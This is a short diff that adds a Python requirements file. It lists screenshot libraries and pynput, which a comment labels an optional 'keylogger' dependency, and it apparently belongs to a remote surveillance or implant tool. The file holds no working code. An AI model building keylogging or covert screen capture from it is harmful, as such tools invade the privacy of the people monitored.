@@ -1,0 +1,11 @@
+# Core dependencies
+# TLS is handled by Python's stdlib ssl module — no pip dependency needed.
+
+# Optional — screenshot capture (install 'mss' for best cross-platform support)
+mss>=9.0.1
+
+# Optional — keylogger (Linux/macOS/Windows input capture)
+pynput>=1.7.6
+
+# Optional — fallback screenshot backend if mss is unavailable
+pillow>=10.0.0
